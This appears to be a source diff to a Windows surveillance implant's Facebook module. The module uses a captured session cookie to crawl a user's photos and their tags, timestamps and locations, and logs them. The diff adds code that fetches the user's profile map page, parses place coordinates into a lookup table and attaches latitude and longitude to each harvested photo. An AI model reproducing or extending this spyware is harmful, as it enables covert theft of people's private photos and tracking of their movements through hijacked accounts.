@@ -2,11 +2,14 @@
 #include <WinInet.h>
 #include <string>
 
+
 #include "photo.h"
 #include "cookies.h"
 #include "conf.h"
 #include "facebook.h"
 #include "globals.h"
+#include "JSON.h"
+#include "JSONValue.h"
 #include "proto.h"
 #include "social.h"
 #include "utils.h"
@@ -30,7 +33,7 @@
 #define FBID_PHOTO_CAPTION   "<span class=\"hasCaption\">"
 #define FBID_PHOTO_TAG_LIST	 "<span class=\"fbPhotoTagList\" id=\"fbPhotoPageTagList\">"
 #define FBID_PHOTO_TAG_ITEM  "<span class=\"fbPhotoTagListTag tagItem\">"
-#define FBID_PHOTO_LOCATION  "in <span class=\"fbPhotoTagListTag withTagItem tagItem\">"
+#define FBID_PHOTO_LOCATION  "<span class=\"fbPhotoTagListTag withTagItem tagItem\">"
 #define FBID_PHOTO_TIMESTAMP "fbPhotoPageTimestamp"
 
 typedef struct _facebook_photo_id {
@@ -40,6 +43,13 @@ typedef struct _facebook_photo_id {
 	DWORD   dwType;			
 	UT_hash_handle hh;		// handle
 } facebook_photo_id;
+
+typedef struct _facebook_placeId_to_location {
+	UINT64 placeId;   // key
+	FLOAT  latitude;
+	FLOAT  longitude;
+	UT_hash_handle hh;
+} facebook_placeId_to_location;
 
 /* start of string utils*/
 bool replace(std::string& str, const std::string& from, const std::string& to) {
@@ -387,7 +397,7 @@ LPSTR FacebookPhotoExtractPhotoTags(LPSTR strHtmlPage)
 					location format is latitude,longitude:
 					45.0,-9.1
 */
-LPSTR FacebookPhotoExtractPhotoLocation(__in LPSTR strCookie, __in LPSTR strHtmlPage)
+LPSTR FacebookPhotoExtractPhotoLocation(__in LPSTR strCookie, __in LPSTR strHtmlPage, facebook_placeId_to_location *idToLocation_hash_head)
 {
 	/*	
 		allocations:
@@ -400,13 +410,10 @@ LPSTR FacebookPhotoExtractPhotoLocation(__in LPSTR strCookie, __in LPSTR strHtml
 	LPSTR strLocation = NULL;
 
 	/*	location:
-			a]	fetch page from:
+			a]	find
 				<span class="fbPhotoTagListTag withTagItem tagItem"><input type="hidden" autocomplete="off" name="tag[]" value="231160113588411"><a class="taggee" href="https://www.facebook.com/pages/Nurburgring-Nordschleife/231160113588411?ref=stream" data-hovercard="/ajax/hovercard/page.php?id=231160113588411" aria-owns="js_9" aria-haspopup="true" id="js_a">Nurburgring Nordschleife</a></span>
 			
-			b]	find {"vertex_section":"VertexPlaceMapSection"} and 
-				parse link <a role="button" onmouseover="LinkshimAsyncLink.swap(this, "https:\/\/www.bing.com\/maps\/default.aspx?v=2&pc=FACEBK&mid=8100&rtp=adr.\u00257Epos.50.335555555556_6.9475_N\u0025C3\u0025BCrburgring+Betriebsgesellschaft+mbH\u00252C+Otto-Flimm-Stra\u0025C3\u00259Fe\u00252C+53520
-				coordinates start after "pos."
-			
+			b]	value s.a. 231160113588411 is the placeId and key idToLocation_hash_head
 	*/
 
 	strParser1 = strstr(strHtmlPage, FBID_PHOTO_LOCATION);
@@ -414,11 +421,11 @@ LPSTR FacebookPhotoExtractPhotoLocation(__in LPSTR strCookie, __in LPSTR strHtml
 	{
 		/* a] */
 		strParser1 += strlen(FBID_PHOTO_LOCATION);
-		strParser1 = strstr(strParser1, "class=\"taggee\" href=\"https://www.facebook.com");
+		strParser1 = strstr(strParser1, "value=\"");
 		if (!strParser1)
 			return NULL;
 		
-		strParser1 += strlen("class=\"taggee\" href=\"https://www.facebook.com");
+		strParser1 += strlen("value=\"");
 		
 		strParser2 = strstr(strParser1, "\"");
 		if (!strParser2)
@@ -430,85 +437,32 @@ LPSTR FacebookPhotoExtractPhotoLocation(__in LPSTR strCookie, __in LPSTR strHtml
 		*strParser2 = NULL;
 
 #ifdef _DEBUG
-		OutputDebug(L"[*] %S - location url: %S\n", __FUNCTION__, strParser1);
+		OutputDebug(L"[*] %S - place id : %S\n", __FUNCTION__, strParser1);
 #endif
 		
-		LPWSTR strUrl = (LPWSTR) zalloc_s(URL_SIZE_IN_CHARS * sizeof(WCHAR));
-		if (!strUrl)
+		UINT64 thisPlaceId = _strtoui64(strParser1, NULL, 10);
+		if (!thisPlaceId)
 			return NULL;
 
-		_snwprintf_s(strUrl, URL_SIZE_IN_CHARS, _TRUNCATE, L"%S", strParser1);
+		facebook_placeId_to_location *findMe = NULL;
+		HASH_FIND(hh, idToLocation_hash_head, &thisPlaceId, sizeof(UINT64), findMe);
+
+		if (findMe == NULL)
+			return NULL;
+
+		/* prepare full string */
+		strLocation = (LPSTR) zalloc_s(64); 
+		if (strLocation)
+			_snprintf_s(strLocation, 64, _TRUNCATE, "%f,%f", findMe->latitude, findMe->longitude );
+
+
+#ifdef _DEBUG
+		OutputDebug(L"[*] %S - coordinates id : %f - %f\n", __FUNCTION__, findMe->latitude, findMe->longitude);
+#endif
 
 		/* restore input page */
 		*strParser2 = chTmp;
 
-		LPSTR strRecvLocation = NULL;
-		DWORD dwBuffSize = 0;
-		DWORD dwRet = HttpSocialRequest(L"www.facebook.com", L"GET", strUrl, 443, NULL, 0, (LPBYTE *) &strRecvLocation, &dwBuffSize, strCookie);
-		zfree_s(strUrl);
-
-		if (dwRet != SOCIAL_REQUEST_SUCCESS)
-			return NULL;
-
-
-		/* b] */
-		strParser1 = strstr(strRecvLocation, "vertex_section&quot;:&quot;VertexPlaceMapSection");
-		if (strParser1)
-		{
-			strParser1 += strlen("vertex_section&quot;:&quot;VertexPlaceMapSection");
-			strParser1 = strstr(strParser1, "pos.");
-
-			if (strParser1)
-			{
-				strParser1 += strlen("pos.");
-
-				/*  format doesn't seem uniform:
-						- pos.50.335555555556_6.9475_N*
-						- pos.-34.6033_-58.3817&cp*
-						- pos.43.7333_7.41667&
-				*/
-
-				CHAR strLatitude[8];  // range -90.000  <-> +90.000
-				SecureZeroMemory(strLatitude, 8);
-
-				CHAR strLongitude[9]; // range -180.000 <-> +180.000
-				SecureZeroMemory(strLongitude, 9);
-
-				strParser2 = strstr(strParser1, "_");
-				if (strParser2)
-				{
-					// latitude is the first token until '_'
-					*strParser2 = NULL;
-					strncpy_s(strLatitude, 8, strParser1, _TRUNCATE);
-
-					strParser1 = strParser2 + 1;
-
-					// save for longitude until we find something which is not a digit or '-' or '.'
-					strParser2 = strParser1;
-					while (TRUE)
-					{
-						chTmp = *(strParser2++);
-						if ( !(isdigit(chTmp) || chTmp == '-' || chTmp == '.') )
-							break;
-					}
-					*(--strParser2) = NULL;
-
-					strncpy_s(strLongitude, 9, strParser1, _TRUNCATE);
-
-#ifdef _DEBUG
-					OutputDebug(L"[*] %S - coordinates: (%S,%S)\n", __FUNCTION__, strLatitude, strLongitude);
-#endif
-
-					/* prepare full string */
-					strLocation = (LPSTR) zalloc_s(32); // anway it can't be more than 8 + 9 + 1 (comma)
-					if (strLocation)
-						_snprintf_s(strLocation, 32, _TRUNCATE, "%s,%s", strLatitude, strLongitude );
-
-				}
-			}
-		} /* end b] */
-
-		zfree_s(strRecvLocation);
 	}
 
 	return strLocation;
@@ -780,7 +734,7 @@ VOID FacebookPhotoLog(__in LPBYTE lpPhotoBlob, __in ULONG uSize, __in LPSTR strC
 	Params:			valid Facebook cookie, struct for fbid
 	Usage:			-
 */
-VOID FacebookPhotoHandleSinglePhoto(__in LPSTR strCookie,  facebook_photo_id *fbid)
+VOID FacebookPhotoHandleSinglePhoto(__in LPSTR strCookie,  facebook_photo_id *fbid, facebook_placeId_to_location *idToLocation_hash_head)
 {
 
 	/*	
@@ -832,7 +786,7 @@ VOID FacebookPhotoHandleSinglePhoto(__in LPSTR strCookie,  facebook_photo_id *fb
 	LPSTR strTags = FacebookPhotoExtractPhotoTags(facebookPhotoPageSanitized);
 	
 	/*	e] optional - location */
-	LPSTR strLocation = FacebookPhotoExtractPhotoLocation(strCookie, facebookPhotoPageSanitized);
+	LPSTR strLocation = FacebookPhotoExtractPhotoLocation(strCookie, facebookPhotoPageSanitized, idToLocation_hash_head);
 
 	/*  f] optional - timestamp */
 	LPSTR strEpochTimestamp = FacebookPhotoExtractTimestamp(facebookPhotoPageSanitized);
@@ -1227,6 +1181,205 @@ VOID FacebookPhotoCrawlAlbums(__in LPSTR strCookie, __in LPSTR strUserId, __in L
 	zfree_s(strUrlSinglePhoto);
 }
 
+/*
+	Description:	given a json object containing Facebook places, extracts and packs data into additionalheader and body
+	Parameters:		json object, pointer to additionalheader, body that will contain the payload, pointer to size of body, Facebook user id
+	Usage:			return true there're data to log, false otherwise. Body is allocated and must be freed by the caller
+*/
+BOOL FacebookPlacesExtractPositions(__in JSONValue *jValue,  __in LPSTR strUserId, facebook_placeId_to_location **hash_head )
+{
+	/* pretty much a ripoff of FacebookPlacesExtractPosition(__in JSONValue *jValue, __out location_additionalheader_struct *additionalheader, __out BYTE **body, __out DWORD *blen, __in LPSTR strUserId ):position.cpp */
+	
+	/* get last place timestamp */
+	DWORD dwHighestBatchTimestamp = 0;
+	CHAR strUsernameForPlaces[512];
+	_snprintf_s(strUsernameForPlaces, sizeof(strUsernameForPlaces), _TRUNCATE, "%s-facebookphotopositions", strUserId);
+	DWORD dwLastTimestampLow, dwLastTimestampHigh;
+	dwLastTimestampLow = SocialGetLastTimestamp(strUsernameForPlaces, &dwLastTimestampHigh);
+	if (dwLastTimestampLow == SOCIAL_INVALID_MESSAGE_ID)
+		return FALSE;
+
+	/* get the number of locations */
+	JSONObject jRoot = jValue->AsObject();
+	if (jRoot.find(L"jsmods") != jRoot.end() && jRoot[L"jsmods"]->IsObject())
+	{
+		JSONObject jJsmods = jRoot[L"jsmods"]->AsObject();
+
+		if (jJsmods.find(L"require") != jJsmods.end() && jJsmods[L"require"]->IsArray())
+		{
+			JSONArray jRequire = jJsmods[L"require"]->AsArray();
+
+			if ( jRequire.size() > 0 && jRequire.at(0)->IsArray())
+			{
+				JSONArray jTmp = jRequire.at(0)->AsArray();
+				if (jTmp.size() > 3 && jTmp.at(3)->IsArray())
+				{
+					JSONArray jTmp2 = jTmp.at(3)->AsArray();
+
+					if (jTmp2.size() > 1 && jTmp2.at(1)->IsObject())
+					{
+						JSONObject jObj = jTmp2.at(1)->AsObject();
+						
+
+						/* jObj contains:
+						"stories":[ array with timestamps ],
+						"places":[ array with places ],
+						"count":4, // number of different places
+						"_instanceid":"u_0_44"
+						*/
+
+						if ((jObj[L"places"]->IsArray() && jObj[L"places"]->IsArray()) && (jObj[L"stories"]->IsArray() && jObj[L"stories"]->IsArray()))
+						{
+							JSONArray jPlaces = jObj[L"places"]->AsArray();
+							JSONArray jStories = jObj[L"stories"]->AsArray();
+
+							/*  stories element example: {"timestamp":1418910342, .. ,"placeID":133355006713850, ..  }
+								places element example:  {"id":133355006713850, "name":"Isle of Skye, Scotland, UK","latitude":57.41219383264, "longitude":-6.1920373066084,"city":814578, "country":"GB"   } 
+							*/
+
+							/* loop through stories, for each story find the corresponding place and set the gps record (suboptimal..) */
+							for (DWORD i=0; i<jStories.size(); i++)
+							{
+								if (!jStories.at(i)->IsObject())
+									continue;
+
+								UINT64 current_id;
+								time_t time = 0;
+
+								/* extract story id and timestamp */
+								JSONObject jStory = jStories.at(i)->AsObject();
+								if (jStory.find(L"placeID") != jStory.end() && jStory[L"placeID"]->IsNumber())
+								{
+									current_id = (UINT64) jStory[L"placeID"]->AsNumber();
+								}
+								
+								if (jStory.find(L"timestamp") != jStory.end() && jStory[L"timestamp"]->IsNumber())
+								{
+									 time = (time_t) jStory[L"timestamp"]->AsNumber();
+								}
+
+								
+								/* save the most recent timestamp for this batch */
+								if (time > dwHighestBatchTimestamp)
+									dwHighestBatchTimestamp = time;
+								
+								/* if it's recent save it otherwise skip this record */
+								if (time <= dwLastTimestampLow)
+									continue;
+
+								/* find place id in places: suboptimal version loop through each time */
+								for (DWORD j=0; j<jPlaces.size(); j++)
+								{
+									if (!jPlaces.at(j)->IsObject())
+										continue;
+
+									UINT64 tmp_id;
+
+									JSONObject jPlace = jPlaces.at(j)->AsObject();
+									if (jPlace.find(L"id") != jPlace.end() && jPlace[L"id"]->IsNumber())
+									{
+										tmp_id = (UINT64) jPlace[L"id"]->AsNumber();
+
+										if (tmp_id == current_id)
+										{
+											/* got our guy, fill a gps position record */
+
+											if (jPlace.find(L"latitude") != jPlace.end() && jPlace[L"latitude"]->IsNumber() &&
+												jPlace.find(L"longitude") != jPlace.end() && jPlace[L"longitude"]->IsNumber())
+											{
+#ifdef _DEBUG
+												OutputDebug(L"[*] Got %I64u lat long\n", tmp_id, jPlace[L"latitude"]->AsNumber(), jPlace[L"longitude"]->AsNumber());
+#endif
+												facebook_placeId_to_location *placeId_new = (facebook_placeId_to_location*) zalloc_s(sizeof(facebook_placeId_to_location));
+												placeId_new->placeId = tmp_id;
+												placeId_new->latitude =  (FLOAT) jPlace[L"latitude"]->AsNumber();
+												placeId_new->longitude = (FLOAT) jPlace[L"longitude"]->AsNumber();
+
+												facebook_placeId_to_location *placeId_tmp = NULL;
+												HASH_FIND(hh, *hash_head, &placeId_new->placeId, sizeof(UINT64), placeId_tmp);
+												
+												if (placeId_tmp == NULL) 
+													HASH_ADD(hh, *hash_head, placeId, sizeof(UINT64), placeId_new);
+												else
+													zfree_s(placeId_new);
+											}			
+
+											break;
+										} //if (tmp_id == current_id)
+									} //if (jPlace.find(L"id") != jPlace.end() && jPlace[L"id"]->IsNumber())
+								} //for (DWORD j=0; j<jPlaces.size(); j++)
+							} //for (DWORD i=0; i<jStories.size(); i++)
+
+
+							/* save the highest timestamp in the batch */
+							if (dwHighestBatchTimestamp > dwLastTimestampLow)
+								SocialSetLastTimestamp(strUsernameForPlaces, dwHighestBatchTimestamp, 0);
+
+						} //if ((jObj[L"places"]->IsArray() && jObj[L"places"]->IsArray())
+					} //if (jTmp2.size() > 1 && jTmp2.at(1)->IsObject())
+				}
+			}
+		}
+	}
+
+	/* 	true if *body is not null, otherwise false */
+	return TRUE;
+}
+
+VOID FacebookPhotoFetchPlaceIdToCoordinate(__in LPSTR strCookie, __in LPSTR strUserId, facebook_placeId_to_location **idToLocation)
+{
+	/* pretty much a ripoff of FacebookPositionHandler(LPSTR strCookie):position.cpp */
+	LPSTR strParser1, strParser2;
+	
+
+	LPWSTR strUrl = (LPWSTR) zalloc(2048*sizeof(WCHAR));
+	_snwprintf_s(strUrl, 2048, _TRUNCATE, L"/profile.php?id=%S&sk=map", strUserId);
+	
+	LPSTR strRecvBuffer = NULL;
+	DWORD dwBuffSize;
+	DWORD dwRet = HttpSocialRequest(L"www.facebook.com", L"GET", strUrl, 443, NULL, 0, (LPBYTE *)&strRecvBuffer, &dwBuffSize, strCookie); 
+
+	zfree_s(strUrl);
+
+	if (dwRet != SOCIAL_REQUEST_SUCCESS)
+	{
+		zfree(strRecvBuffer);
+		return;
+	}
+
+	/* find the snippet of json we're interested in and give it to the parser */
+	strParser1 = strstr(strRecvBuffer, "{\"display_dependency\":[\"pagelet_timeline_medley_inner_map\"]");
+	if (!strParser1)
+	{
+		/* cleanup */
+		zfree_s(strRecvBuffer);
+		return;
+	}
+
+	strParser2 = strstr(strParser1, "})");
+	*(strParser2+1) = NULL;
+
+#ifdef _DEBUG
+		OutputDebug(L"[*] %S - position json: %S\n", __FUNCTION__, strParser1);
+#endif
+
+	LPSTR strJson = strParser1;
+
+	JSONValue *jValue = JSON::Parse(strJson);
+	if (jValue != NULL && jValue->IsObject())
+	{
+		FacebookPlacesExtractPositions(jValue, strUserId, idToLocation);
+	}
+
+	/* cleanup */
+	zfree_s(strRecvBuffer);
+
+	if (jValue)
+		delete jValue;
+
+	return;
+}
+
 
 /*
 	Description:	Facebook photo handling entry point, extracts Facebook photos and its metadata
@@ -1294,8 +1447,15 @@ DWORD FacebookPhotoHandler(__in LPSTR strCookie)
 	// photos from album managed by two users are found only in Albums
 	FacebookPhotoCrawlAlbums(strCookie, strUserId, strRecvBuffer, &hash_head);
 	
+
+	/* 4] if there are some photos fetch pre-emptively the map pages containing 
+		  the mapping place_id -> coordinates */
+	facebook_placeId_to_location *idToLocation_hash_head = NULL;
+
+	if (HASH_COUNT(hash_head) > 0 )
+		FacebookPhotoFetchPlaceIdToCoordinate(strCookie, strUserId, &idToLocation_hash_head);
 		
-	/* 4] Once we've collected all the fbids, 'handle' the photos */
+	/* 5] Once we've collected all the fbids, 'handle' the photos */
 	facebook_photo_id *fbid_tmp, *fbid_current;
 
 
@@ -1332,7 +1492,7 @@ DWORD FacebookPhotoHandler(__in LPSTR strCookie)
 					dwCurrentItemsPerRun_0 < dwMaxItemsPerRun_0 )
 				{
 					// handle the photo
-					FacebookPhotoHandleSinglePhoto(strCookie, fbid_current);
+					FacebookPhotoHandleSinglePhoto(strCookie, fbid_current, idToLocation_hash_head);
 					dwCurrentItemsPerRun_0 +=1;
 
 					// update highest batch fbid in case
@@ -1348,7 +1508,7 @@ DWORD FacebookPhotoHandler(__in LPSTR strCookie)
 					dwCurrentItemsPerRun_1 < dwMaxItemsPerRun_1 )
 				{
 					// handle the photo
-					FacebookPhotoHandleSinglePhoto(strCookie, fbid_current);
+					FacebookPhotoHandleSinglePhoto(strCookie, fbid_current,  idToLocation_hash_head);
 					dwCurrentItemsPerRun_1 +=1;
 
 					// update highest batch fbid in case
@@ -1370,6 +1530,15 @@ DWORD FacebookPhotoHandler(__in LPSTR strCookie)
 		if (highestBatchFbid_1 > savedHighestBatchFbid_1)
 			SocialSetLastMessageId(strSocialUsername_1, highestBatchFbid_1 );
 	
+
+		// free facebook_placeId_to_location *idToLocation
+		facebook_placeId_to_location *placeId_tmp, *placeId_current;
+		HASH_ITER(hh, idToLocation_hash_head, placeId_current, placeId_tmp)
+		{
+			HASH_DEL(idToLocation_hash_head, placeId_current);
+			zfree_s(placeId_current);
+		}
+
 
 		zfree_s(strSocialUsername_0);
 		zfree_s(strSocialUsername_1);
